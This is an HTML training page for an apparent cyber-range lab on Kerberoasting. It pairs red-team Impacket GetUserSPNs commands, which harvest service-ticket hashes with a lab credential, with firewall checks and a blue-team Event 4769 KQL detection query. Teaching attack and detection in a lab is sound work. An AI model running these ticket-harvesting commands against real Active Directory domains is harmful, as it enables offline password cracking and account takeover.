@@ -1,0 +1,705 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Try-IT Labs | Mission 01 Runbook (3-Lane Interactive Engine)</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg-dark: #090d16;
+      --bg-card: #0f172a;
+      --bg-card-hover: #131d36;
+      --border-subtle: #1e293b;
+      --border-glow: #334155;
+      
+      --red-accent: #f43f5e;
+      --red-bg: rgba(244, 63, 94, 0.08);
+      --red-border: rgba(244, 63, 94, 0.3);
+      
+      --infra-accent: #f59e0b;
+      --infra-bg: rgba(245, 158, 11, 0.08);
+      --infra-border: rgba(245, 158, 11, 0.3);
+      
+      --blue-accent: #06b6d4;
+      --blue-bg: rgba(6, 182, 212, 0.08);
+      --blue-border: rgba(6, 182, 212, 0.3);
+
+      --success-accent: #10b981;
+      --text-main: #f8fafc;
+      --text-muted: #94a3b8;
+      --code-bg: #030712;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background-color: var(--bg-dark);
+      color: var(--text-main);
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      line-height: 1.5;
+      padding-bottom: 80px;
+    }
+
+    /* Header & Mission Banner */
+    header {
+      background: linear-gradient(180deg, #111827 0%, #0b1120 100%);
+      border-bottom: 1px solid var(--border-subtle);
+      padding: 24px 32px;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      backdrop-filter: blur(12px);
+    }
+
+    .header-top {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 16px;
+    }
+
+    .brand-group {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+
+    .brand-badge {
+      background: linear-gradient(135deg, #0284c7 0%, #0369a1 100%);
+      color: #fff;
+      font-weight: 800;
+      font-size: 0.85rem;
+      padding: 6px 12px;
+      border-radius: 8px;
+      letter-spacing: 0.05em;
+      text-transform: uppercase;
+      box-shadow: 0 0 15px rgba(2, 132, 199, 0.4);
+    }
+
+    .brand-title {
+      font-size: 1.35rem;
+      font-weight: 800;
+      color: #fff;
+      letter-spacing: -0.02em;
+    }
+
+    .mission-meta {
+      font-size: 0.85rem;
+      color: var(--text-muted);
+      margin-top: 4px;
+    }
+
+    .progress-box {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      background: rgba(15, 23, 42, 0.8);
+      border: 1px solid var(--border-subtle);
+      padding: 8px 16px;
+      border-radius: 20px;
+    }
+
+    .progress-bar-container {
+      width: 140px;
+      height: 8px;
+      background: #1e293b;
+      border-radius: 4px;
+      overflow: hidden;
+    }
+
+    .progress-bar-fill {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #06b6d4, #10b981);
+      transition: width 0.3s ease;
+    }
+
+    .progress-text {
+      font-size: 0.8rem;
+      font-weight: 600;
+      color: var(--text-muted);
+    }
+
+    /* Filter Toolbar */
+    .toolbar {
+      max-width: 1600px;
+      margin: 20px auto 0;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 12px;
+    }
+
+    .filter-pills {
+      display: flex;
+      gap: 8px;
+      background: #0f172a;
+      padding: 4px;
+      border-radius: 10px;
+      border: 1px solid var(--border-subtle);
+    }
+
+    .filter-btn {
+      background: transparent;
+      border: none;
+      color: var(--text-muted);
+      padding: 6px 14px;
+      font-size: 0.82rem;
+      font-weight: 600;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+
+    .filter-btn:hover {
+      color: #fff;
+    }
+
+    .filter-btn.active {
+      background: #1e293b;
+      color: #fff;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.4);
+    }
+
+    /* Swimlane Grid Layout */
+    .swimlane-container {
+      max-width: 1600px;
+      margin: 24px auto 0;
+      padding: 0 32px;
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 24px;
+      align-items: start;
+    }
+
+    .lane {
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+      transition: opacity 0.2s ease;
+    }
+
+    .lane-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 12px 18px;
+      border-radius: 12px;
+      font-weight: 700;
+      font-size: 0.95rem;
+      letter-spacing: -0.01em;
+      position: sticky;
+      top: 100px;
+      z-index: 10;
+      backdrop-filter: blur(10px);
+    }
+
+    .lane-red .lane-header {
+      background: var(--red-bg);
+      border: 1px solid var(--red-border);
+      color: var(--red-accent);
+    }
+
+    .lane-infra .lane-header {
+      background: var(--infra-bg);
+      border: 1px solid var(--infra-border);
+      color: var(--infra-accent);
+    }
+
+    .lane-blue .lane-header {
+      background: var(--blue-bg);
+      border: 1px solid var(--blue-border);
+      color: var(--blue-accent);
+    }
+
+    .lane-badge {
+      font-size: 0.72rem;
+      padding: 3px 8px;
+      border-radius: 6px;
+      font-weight: 700;
+      background: rgba(0, 0, 0, 0.4);
+    }
+
+    /* Cards */
+    .step-card {
+      background: var(--bg-card);
+      border: 1px solid var(--border-subtle);
+      border-radius: 14px;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+      transition: all 0.25s ease;
+      position: relative;
+    }
+
+    .step-card:hover {
+      border-color: var(--border-glow);
+      background: var(--bg-card-hover);
+      transform: translateY(-2px);
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
+    }
+
+    .step-card.completed {
+      border-color: var(--success-accent);
+      background: rgba(16, 185, 129, 0.04);
+    }
+
+    .step-top {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      gap: 12px;
+    }
+
+    .step-label {
+      font-size: 0.72rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      color: var(--text-muted);
+    }
+
+    .step-title {
+      font-size: 1.05rem;
+      font-weight: 700;
+      color: #fff;
+      margin-top: 2px;
+    }
+
+    .check-btn {
+      background: #1e293b;
+      border: 1px solid var(--border-subtle);
+      color: var(--text-muted);
+      width: 26px;
+      height: 26px;
+      border-radius: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      font-size: 0.85rem;
+      transition: all 0.2s ease;
+      flex-shrink: 0;
+    }
+
+    .check-btn:hover {
+      border-color: var(--success-accent);
+      color: #fff;
+    }
+
+    .step-card.completed .check-btn {
+      background: var(--success-accent);
+      border-color: var(--success-accent);
+      color: #fff;
+    }
+
+    .step-desc {
+      font-size: 0.88rem;
+      color: #cbd5e1;
+      line-height: 1.5;
+    }
+
+    /* Terminal / Code Box */
+    .terminal-box {
+      background: var(--code-bg);
+      border: 1px solid #1f293d;
+      border-radius: 10px;
+      overflow: hidden;
+      font-family: 'Fira Code', monospace;
+      font-size: 0.82rem;
+    }
+
+    .terminal-header {
+      background: #0b1120;
+      padding: 6px 12px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid #1f293d;
+    }
+
+    .terminal-dots {
+      display: flex;
+      gap: 6px;
+    }
+
+    .dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+    }
+    .dot-red { background: #ef4444; }
+    .dot-yellow { background: #f59e0b; }
+    .dot-green { background: #10b981; }
+
+    .terminal-host {
+      font-size: 0.72rem;
+      color: var(--text-muted);
+      font-weight: 600;
+    }
+
+    .copy-btn {
+      background: transparent;
+      border: 1px solid #334155;
+      color: var(--text-muted);
+      padding: 2px 8px;
+      border-radius: 4px;
+      font-size: 0.7rem;
+      cursor: pointer;
+      font-family: 'Inter', sans-serif;
+      transition: all 0.15s ease;
+    }
+
+    .copy-btn:hover {
+      background: #1e293b;
+      color: #fff;
+    }
+
+    .terminal-body {
+      padding: 12px 14px;
+      overflow-x: auto;
+      color: #e2e8f0;
+      white-space: pre-wrap;
+      line-height: 1.45;
+    }
+
+    .terminal-body .cmd { color: #38bdf8; font-weight: 600; }
+    .terminal-body .flag { color: #a78bfa; }
+    .terminal-body .arg { color: #fbbf24; }
+    .terminal-body .comment { color: #64748b; font-style: italic; }
+
+    /* Alert Boxes Inside Cards */
+    .alert-pill {
+      font-size: 0.8rem;
+      padding: 8px 12px;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .alert-pill.alert-red { background: var(--red-bg); border-left: 3px solid var(--red-accent); color: #fecdd3; }
+    .alert-pill.alert-infra { background: var(--infra-bg); border-left: 3px solid var(--infra-accent); color: #fef3c7; }
+    .alert-pill.alert-blue { background: var(--blue-bg); border-left: 3px solid var(--blue-accent); color: #cffafe; }
+
+    /* Responsive */
+    @media (max-width: 1200px) {
+      .swimlane-container {
+        grid-template-columns: 1fr;
+      }
+      .lane-header {
+        position: static;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Top Header Navigation -->
+  <header>
+    <div class="header-top">
+      <div class="brand-group">
+        <span class="brand-badge">Season 0</span>
+        <div>
+          <h1 class="brand-title">Try-IT Labs: Enterprise Cyber Range</h1>
+          <p class="mission-meta">Mission 01: Kerberoasting & Lateral Movement • PA-220 + Dell S3124 + R640 Cluster</p>
+        </div>
+      </div>
+
+      <div class="progress-box">
+        <span class="progress-text">Lab Progress: <strong id="progress-percent">0%</strong></span>
+        <div class="progress-bar-container">
+          <div class="progress-bar-fill" id="progress-fill"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Filter Buttons -->
+    <div class="toolbar">
+      <div class="filter-pills">
+        <button class="filter-btn active" onclick="filterLane('all')">👁️ All Lanes</button>
+        <button class="filter-btn" onclick="filterLane('red')">🔴 Red Team</button>
+        <button class="filter-btn" onclick="filterLane('infra')">🔀 Infrastructure</button>
+        <button class="filter-btn" onclick="filterLane('blue')">🔵 Blue Team</button>
+      </div>
+      <div style="font-size: 0.82rem; color: var(--text-muted);">
+        Click <strong style="color: #fff;">✓</strong> to track your lab execution
+      </div>
+    </div>
+  </header>
+
+  <!-- 3-Lane Swimlane Container -->
+  <main class="swimlane-container">
+
+    <!-- LANE 1: RED TEAM -->
+    <div class="lane lane-red" id="lane-red">
+      <div class="lane-header">
+        <span>🔴 Lane 1: Red / Attack Emulation</span>
+        <span class="lane-badge">Offense</span>
+      </div>
+
+      <!-- Step 1.1 -->
+      <div class="step-card" id="card-1">
+        <div class="step-top">
+          <div>
+            <span class="step-label">Step 01 • SPN Recon</span>
+            <h2 class="step-title">Query Kerberoastable SPNs</h2>
+          </div>
+          <button class="check-btn" onclick="toggleComplete('card-1')" title="Toggle Complete">✓</button>
+        </div>
+        <p class="step-desc">Enumerate Active Directory accounts tied to Service Principal Names without generating mass network noise.</p>
+        
+        <div class="terminal-box">
+          <div class="terminal-header">
+            <div class="terminal-dots">
+              <span class="dot dot-red"></span>
+              <span class="dot dot-yellow"></span>
+              <span class="dot dot-green"></span>
+            </div>
+            <span class="terminal-host">kali@10.0.30.50</span>
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          </div>
+          <div class="terminal-body"><span class="cmd">python3</span> /opt/impacket/examples/GetUserSPNs.py \
+  <span class="arg">tryitlabs.local/jdoe:Summer2026!</span> \
+  <span class="flag">-dc-ip</span> 10.0.20.10 \
+  <span class="flag">-request</span></div>
+        </div>
+
+        <div class="alert-pill alert-red">
+          ⚡ <strong>Emulation Target:</strong> SPN <code>MSSQLSvc/db01.tryitlabs.local:1433</code>
+        </div>
+      </div>
+
+      <!-- Step 1.2 -->
+      <div class="step-card" id="card-2">
+        <div class="step-top">
+          <div>
+            <span class="step-label">Step 02 • Ticket Harvest</span>
+            <h2 class="step-title">Extract Kerberos TGS Hash</h2>
+          </div>
+          <button class="check-btn" onclick="toggleComplete('card-2')" title="Toggle Complete">✓</button>
+        </div>
+        <p class="step-desc">Request the service ticket using RC4-HMAC downgrade and dump into Hashcat format (mode 13100).</p>
+        
+        <div class="terminal-box">
+          <div class="terminal-header">
+            <div class="terminal-dots">
+              <span class="dot dot-red"></span>
+              <span class="dot dot-yellow"></span>
+              <span class="dot dot-green"></span>
+            </div>
+            <span class="terminal-host">kali@10.0.30.50</span>
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          </div>
+          <div class="terminal-body"><span class="cmd">python3</span> /opt/impacket/examples/GetUserSPNs.py \
+  <span class="arg">tryitlabs.local/jdoe:Summer2026!</span> \
+  <span class="flag">-dc-ip</span> 10.0.20.10 \
+  <span class="flag">-outputfile</span> hashes.txt</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- LANE 2: INFRASTRUCTURE -->
+    <div class="lane lane-infra" id="lane-infra">
+      <div class="lane-header">
+        <span>🔀 Lane 2: Infrastructure & Wire</span>
+        <span class="lane-badge">PA-220 & S3124</span>
+      </div>
+
+      <!-- Step 2.1 -->
+      <div class="step-card" id="card-3">
+        <div class="step-top">
+          <div>
+            <span class="step-label">Step 01 • Trunk Inspection</span>
+            <h2 class="step-title">Dell S3124 VLAN Trunking</h2>
+          </div>
+          <button class="check-btn" onclick="toggleComplete('card-3')" title="Toggle Complete">✓</button>
+        </div>
+        <p class="step-desc">Verify that traffic between Attacker (VLAN 30) and DC (VLAN 20) is forced through the PA-220 firewall gateway.</p>
+        
+        <div class="terminal-box">
+          <div class="terminal-header">
+            <div class="terminal-dots">
+              <span class="dot dot-red"></span>
+              <span class="dot dot-yellow"></span>
+              <span class="dot dot-green"></span>
+            </div>
+            <span class="terminal-host">S3124-CORE#</span>
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          </div>
+          <div class="terminal-body"><span class="cmd">show</span> interfaces switchport Gi1/0/24
+<span class="comment">! Trunking VLANs 20, 30 to PA-220 eth1/2</span></div>
+        </div>
+
+        <div class="alert-pill alert-infra">
+          ⚙️ <strong>Network Policy:</strong> Inter-VLAN routing without firewall bypass is blocked.
+        </div>
+      </div>
+
+      <!-- Step 2.2 -->
+      <div class="step-card" id="card-4">
+        <div class="step-top">
+          <div>
+            <span class="step-label">Step 02 • App-ID Verification</span>
+            <h2 class="step-title">Palo Alto App-ID Session Audit</h2>
+          </div>
+          <button class="check-btn" onclick="toggleComplete('card-4')" title="Toggle Complete">✓</button>
+        </div>
+        <p class="step-desc">Verify Layer 7 App-ID resolution recognizes <code>kerberos</code> and <code>ldap</code> traffic crossing security zones.</p>
+        
+        <div class="terminal-box">
+          <div class="terminal-header">
+            <div class="terminal-dots">
+              <span class="dot dot-red"></span>
+              <span class="dot dot-yellow"></span>
+              <span class="dot dot-green"></span>
+            </div>
+            <span class="terminal-host">admin@PA-220></span>
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          </div>
+          <div class="terminal-body"><span class="cmd">show</span> session all filter application kerberos
+<span class="comment">! Session State: ACTIVE FLOW (Zone: Trust-V30 -> Identity-V20)</span></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- LANE 3: BLUE TEAM -->
+    <div class="lane lane-blue" id="lane-blue">
+      <div class="lane-header">
+        <span>🔵 Lane 3: Blue / SOC Telemetry</span>
+        <span class="lane-badge">Defense</span>
+      </div>
+
+      <!-- Step 3.1 -->
+      <div class="step-card" id="card-5">
+        <div class="step-top">
+          <div>
+            <span class="step-label">Step 01 • Telemetry Intake</span>
+            <h2 class="step-title">Ingest Windows Event 4769</h2>
+          </div>
+          <button class="check-btn" onclick="toggleComplete('card-5')" title="Toggle Complete">✓</button>
+        </div>
+        <p class="step-desc">Windows Security Log Event 4769 records every Kerberos Service Ticket requested from the KDC.</p>
+        
+        <div class="terminal-box">
+          <div class="terminal-header">
+            <div class="terminal-dots">
+              <span class="dot dot-red"></span>
+              <span class="dot dot-yellow"></span>
+              <span class="dot dot-green"></span>
+            </div>
+            <span class="terminal-host">Windows Event Viewer</span>
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          </div>
+          <div class="terminal-body"><span class="comment"># Key Event Artifacts:</span>
+EventID: <span class="arg">4769</span>
+Service_Name: <span class="arg">MSSQLSvc/db01.tryitlabs.local</span>
+Ticket_Encryption_Type: <span class="cmd">0x17</span> <span class="comment">(RC4 Downgrade)</span></div>
+        </div>
+
+        <div class="alert-pill alert-blue">
+          🛡️ <strong>Detection Trigger:</strong> Non-machine account requesting <code>0x17</code> cipher ticket.
+        </div>
+      </div>
+
+      <!-- Step 3.2 -->
+      <div class="step-card" id="card-6">
+        <div class="step-top">
+          <div>
+            <span class="step-label">Step 02 • SIEM Query Logic</span>
+            <h2 class="step-title">Elastic KQL Detection Filter</h2>
+          </div>
+          <button class="check-btn" onclick="toggleComplete('card-6')" title="Toggle Complete">✓</button>
+        </div>
+        <p class="step-desc">Production KQL query to alert SOC analysts on Kerberoasting extraction across the enterprise.</p>
+        
+        <div class="terminal-box">
+          <div class="terminal-header">
+            <div class="terminal-dots">
+              <span class="dot dot-red"></span>
+              <span class="dot dot-yellow"></span>
+              <span class="dot dot-green"></span>
+            </div>
+            <span class="terminal-host">Kibana Discover</span>
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          </div>
+          <div class="terminal-body">event.code: <span class="arg">"4769"</span> and 
+winlog.event_data.TicketEncryptionType: <span class="cmd">"0x17"</span> and 
+not winlog.event_data.ServiceName: <span class="arg">"*$"</span></div>
+        </div>
+      </div>
+    </div>
+
+  </main>
+
+  <script>
+    // Copy Command to Clipboard
+    function copyCode(button) {
+      const body = button.closest('.terminal-box').querySelector('.terminal-body');
+      const text = body.innerText;
+      navigator.clipboard.writeText(text).then(() => {
+        const originalText = button.innerText;
+        button.innerText = 'Copied!';
+        button.style.color = '#10b981';
+        button.style.borderColor = '#10b981';
+        setTimeout(() => {
+          button.innerText = originalText;
+          button.style.color = '';
+          button.style.borderColor = '';
+        }, 1800);
+      });
+    }
+
+    // Toggle Card Completion & Progress Bar
+    function toggleComplete(cardId) {
+      const card = document.getElementById(cardId);
+      card.classList.toggle('completed');
+      updateProgress();
+    }
+
+    function updateProgress() {
+      const totalCards = document.querySelectorAll('.step-card').length;
+      const completedCards = document.querySelectorAll('.step-card.completed').length;
+      const pct = Math.round((completedCards / totalCards) * 100);
+
+      document.getElementById('progress-fill').style.width = pct + '%';
+      document.getElementById('progress-percent').innerText = pct + '%';
+    }
+
+    // Lane Filter Toggle
+    function filterLane(laneKey) {
+      const buttons = document.querySelectorAll('.filter-btn');
+      buttons.forEach(btn => btn.classList.remove('active'));
+      event.target.classList.add('active');
+
+      const redLane = document.getElementById('lane-red');
+      const infraLane = document.getElementById('lane-infra');
+      const blueLane = document.getElementById('lane-blue');
+      const container = document.querySelector('.swimlane-container');
+
+      if (laneKey === 'all') {
+        redLane.style.display = 'flex';
+        infraLane.style.display = 'flex';
+        blueLane.style.display = 'flex';
+        container.style.gridTemplateColumns = 'repeat(3, 1fr)';
+      } else {
+        redLane.style.display = (laneKey === 'red') ? 'flex' : 'none';
+        infraLane.style.display = (laneKey === 'infra') ? 'flex' : 'none';
+        blueLane.style.display = (laneKey === 'blue') ? 'flex' : 'none';
+        container.style.gridTemplateColumns = '1fr';
+      }
+    }
+  </script>
+
+</body>
+</html>
